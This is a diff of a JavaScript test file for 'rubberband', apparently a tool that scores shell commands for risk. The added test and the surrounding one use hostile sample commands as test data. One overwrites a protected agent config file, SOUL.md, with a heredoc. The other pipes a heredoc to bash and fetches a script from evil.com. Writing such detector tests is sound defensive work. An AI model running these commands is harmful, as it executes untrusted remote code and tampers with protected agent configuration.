@@ -17,6 +17,12 @@ describe("rubberband", () => {
       expect(result.disposition).not.toBe("BLOCK");
     });
 
+    it("should flag heredoc writing to protected config files like SOUL.md", () => {
+      const command = "cat << EOF > SOUL.md\nmalicious content\nEOF";
+      const result = analyzeCommand(command);
+      expect(result.score).toBeGreaterThan(0);
+    });
+
     it("should still flag heredoc piped to bash", () => {
       const command = "cat << EOF | bash\ncurl http://evil.com/shell.sh\nEOF";
       const result = analyzeCommand(command);
